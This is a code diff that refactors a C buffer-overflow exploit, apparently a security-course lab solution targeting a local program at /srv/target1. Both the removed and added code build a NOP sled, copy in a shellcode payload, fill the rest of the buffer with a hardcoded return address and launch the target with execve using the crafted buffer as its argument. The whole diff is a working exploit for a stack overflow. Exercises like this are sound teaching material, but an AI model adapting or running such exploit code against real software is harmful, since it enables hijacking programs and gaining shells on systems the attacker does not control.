@@ -7,34 +7,38 @@
 
 #define TARGET "/srv/target1"
 
-#define BUFFER_SIZE 409
+const int BUFFER_SIZE = 409;
+const int SHELLCODE_OFFSET = 201;
+const uint32_t RETURN_ADDRESS = 0xffffdb5c;
+
+void prepareExploit(char *buffer) {
+    memset(buffer, 0x90, BUFFER_SIZE - 1);
+    memcpy(buffer + SHELLCODE_OFFSET, shellcode, sizeof(shellcode) - 1);
+
+    for (int i = SHELLCODE_OFFSET + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
+        *(uint32_t *)(buffer + i) = RETURN_ADDRESS;
+    }
+
+    buffer[BUFFER_SIZE - 1] = '\0';
+}
 
 int main(void)
 {
-  char *args[4]; 
-  char *env[1];
+    char *args[4];
+    char *env[1];
+    char exploitBuffer[BUFFER_SIZE];
 
-  char buf[BUFFER_SIZE];
-  memset(buf, 0x90, sizeof(buf)-1);
-  int offset = 201;
-  memcpy(buf+offset, shellcode, sizeof(shellcode)-1);
+    prepareExploit(exploitBuffer);
 
-  uint32_t return_addr = 0xffffdb5c;
+    args[0] = TARGET;
+    args[1] = exploitBuffer;
+    args[2] = "65935";
+    args[3] = NULL;
 
-  for(int i = offset + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
-    *(uint32_t *)(buf + i) = return_addr;
-  }
+    env[0] = NULL;
 
-  buf[BUFFER_SIZE-1] = '\0';
-  
-  args[0] = TARGET;
-  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\xe8\xd4\xff\xff";
-  args[2] = "65935";
-  args[3] = NULL;
-  
-  env[0] = shellcode;
-  execve(TARGET, args, env);
-  fprintf(stderr, "execve failed.\n");
+    execve(TARGET, args, env);
+    fprintf(stderr, "execve failed.\n");
 
-  return 0;
+    return 0;
 }
